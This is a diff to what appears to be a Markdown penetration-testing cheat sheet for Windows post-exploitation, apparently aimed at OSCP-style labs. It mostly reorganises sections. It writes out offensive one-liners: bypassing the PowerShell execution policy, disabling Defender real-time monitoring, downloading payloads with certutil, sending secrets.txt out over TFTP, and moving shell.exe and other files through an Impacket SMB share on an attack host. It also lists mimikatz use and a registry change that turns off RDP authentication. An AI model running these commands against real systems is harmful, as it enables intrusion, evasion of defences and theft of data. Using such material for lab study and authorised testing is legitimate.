@@ -16,7 +16,13 @@
     
     netstat -ano    
     netsh firewall show state 
-    netsh firewall show config
+    netsh firewall show config   
+    
+## Powershell
+    powershell.exe -nop -ep bypass    
+    Get-ExecutionPolicy    
+    Set-ExecutionPolicy Unrestricted   
+    Set-MpPreference -DisableRealtimeMonitoring $true   
  
 ### Windows Kernel Versions 
 systeminfo
@@ -35,12 +41,6 @@ systeminfo
     %WINDIR%\system32\config\AppEvent.Evt                     #application logs
     %WINDIR%\system32\config\SecEvent.Evt                     #security logs
 
-    
-## Powershell
-    powershell.exe -nop -ep bypass    
-    Get-ExecutionPolicy    
-    Set-ExecutionPolicy Unrestricted   
-    Set-MpPreference -DisableRealtimeMonitoring $true   
 
 ## Scripts 
 **You might want to check for AV first!**  
@@ -255,14 +255,34 @@ https://github.com/SecWiki/windows-kernel-exploits
 [CVE 2019-1388](https://github.com/jas502n/CVE-2019-1388)   
 ____   
 
-# File Transfer     
+# Transferring Files    
 [Reference - 15 ways to download files](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/)     
 [Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)   
 [Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     
 
-**try certutil first - sometimes Powershell has problems, check size of file to see if transfer was successful** 
+**try certutil or impacket first - sometimes Powershell has problems, check size of file to see if transfer was successful** 
+Windows XP and earlier: TFTP, Impacket
+Windows 7 - 8.1: Certutil, Impacket, PowerShell 
+Windows 10: Certutil, Impacket, Curl, Powershell 
 
+### Certutil 
     certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
+    
+### Old Boxes (Windows XP and before)  
+For PWK labs - TFTP usually enabled 
+metasploit tfp server module on Kali
+
+    tftp -i 192.168.119.10 PUT secrets.txt   
+    
+ ## Impacket 
+ [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
+ [Reference - Exfil Files from Windows Manually](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)  
+ 
+     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                         #only on a trusted network (no password)   
+     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS        
+     net use \\IP\share /USER:USER PASS    
+     copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
+     copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
     
 ## Powershell
     powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
@@ -307,7 +327,7 @@ ____
      \\tsclient\share\mimikatz\x64\mimikatz.exe   
 
 ____ 
-# Post Exploitation / Exfiltration  
+# Post Exploitation  
 ## Checklist
 Dual home:
 
@@ -346,23 +366,7 @@ Failed to connect, CredSSP required by server.""
 Add this reg key:
 
     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
-
-
-## Transferring Files
- [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
- [Reference - Exfil Files from Windows Manually](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)  
- 
-     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                         #only on a trusted network (no password)   
-     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS        
-     net use \\IP\share /USER:USER PASS    
-     copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
-     copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
      
-### Old Boxes (Windows XP)  
-TFTP usually enabled 
-metasploit tfp server module on Kali
-
-    tftp -i 192.168.119.10 PUT secrets.txt
      
 ## Remote Scripts  
 [lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
